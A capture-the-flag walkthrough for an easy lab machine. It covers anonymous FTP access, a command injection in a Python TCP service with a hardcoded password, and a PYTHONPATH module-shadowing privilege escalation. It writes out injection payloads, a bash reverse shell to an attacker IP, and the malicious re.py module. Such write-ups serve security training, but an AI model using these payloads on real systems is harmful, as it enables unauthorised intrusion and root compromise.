---

### Challenge propertie(s) :
- ##### Difficulty : easy
- ##### Techniques : scan, enumeration, FTP anonymous access, source code disclosure, OS command injection, reverse shell, sudoers misconfiguration, PYTHONPATH injection, Python module shadowing.
- ##### tools : nmap, ftp, nc (netcat), bash, python3.

### Challenge steps :

#### Part 1 : user.txt


1. A basic nmap scan on the target IP.
	-> `nmap 10.10.0.4`

	![nmap scan result](bat1.png)


2. I try to connect to FTP anonymously, a common misconfiguration on FTP servers.
	-> `ftp 10.10.0.4`
	-> `Name: anonymous`
	-> `Password: ` (empty)


3. Once connected, `ls -la` reveals two entries: a script `alert.py` and a world-writable directory `logs`.
	-> `ls -la`
	Output :
	-> `-rwxr-xr-x alert.py`
	-> `drwxrwxrwx logs`

	I download the script to read its source code.
	-> `get alert.py`
	-> `exit`


4. Reading the source code reveals the logic behind the service running on port 3000.
	-> `cat alert.py`

	The script opens a raw TCP socket on port 3000. It asks for a hardcoded password (`G0th4mN33dsTh3B4t!`), then asks for an "emergency" message and writes it to a log file using:
	```python
	os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
	```

	`alert_text` is user-controlled and inserted directly into a shell command with no sanitization: this is a classic **OS command injection** (CWE-78). By closing the single quote early in the input, arbitrary commands can be appended and executed with the privileges of the process running the script.


5. Confirming the vulnerability with a harmless payload, then retrieving the result via the writable FTP `logs` folder.
	-> `nc 10.10.0.4 3000`
	-> `G0th4mN33dsTh3B4t!`
	-> `x'; id > /opt/hotline/logs/test.txt; echo '`

	-> `ftp 10.10.0.4`
	-> `anonymous`
	-> `cd logs`
	-> `get test.txt`
	-> `cat test.txt`
	Output :
	-> `uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)`

	Injection confirmed: commands execute as user `bruce`.


6. Escalating the injection into a full reverse shell. The payload is wrapped in its own isolated `bash -c '...'` sub-shell so it doesn't conflict with the rest of the injected composite command.
	-> `nc -lvnp 4444` (listener, started first)

	-> `nc 10.10.0.4 3000`
	-> `G0th4mN33dsTh3B4t!`
	-> `x'; bash -c 'bash -i >& /dev/tcp/10.8.1.12/4444 0>&1'; echo '`

	A stable interactive shell as `bruce` is received on the listener.


7. Stabilizing the shell for a proper TTY.
	-> `python3 -c 'import pty; pty.spawn("/bin/bash")'`


8. Reading the user flag directly from bruce's home directory.
	-> `ls -la /home/bruce`
	-> `cat /home/bruce/user.txt`
	Output :
	-> `EPI{1s_8ruc3_W4yn3_84tm4n?}`

#### Part 2 : root.txt


1. Checking sudo rights as bruce.
	-> `sudo -l`

	![sudo -l result](bat2.png)

	Two key facts: bruce can run one specific script as root without a password, **and** the `PYTHONPATH` environment variable is preserved by sudo (`env_keep+=PYTHONPATH`) instead of being stripped, which it normally would be for security reasons.


2. Reading the allowed script to identify its imports.
	-> `cat /opt/scanner/gotham_scanner.py`
	Output (relevant part) :
	-> `import time`
	-> `import re`

	Both are standard Python modules. Since `PYTHONPATH` is preserved across the sudo call, a malicious file can be planted with the same name as one of these modules, in a directory that takes priority over the standard library, causing Python to import the attacker's code instead, with root privileges.


3. Building the malicious module. The `re` module is targeted (used only once, low risk of breaking the script before the payload runs). Instead of opening a root shell, the payload directly reads the root flag and copies its content into a file bruce can access.
	-> `mkdir -p /tmp/inj`
	-> `echo 'import os; os.system("cat /root/root.txt > /home/bruce/root.txt")' > /tmp/inj/re.py`


4. Triggering the injection by running the authorized sudo command with the poisoned `PYTHONPATH`.
	-> `sudo PYTHONPATH=/tmp/inj /usr/bin/python3 /opt/scanner/gotham_scanner.py`

	Python resolves `import re` against `/tmp/inj` first, loads the attacker's file, and executes `os.system("cat /root/root.txt > /home/bruce/root.txt")` as root. The content of `/root/root.txt`, normally unreadable by bruce, is copied into `/home/bruce/root.txt`, a file bruce owns and can therefore read.


5. Reading the root flag.

![sudo -l result](bat3.png)
	Root flag obtained.
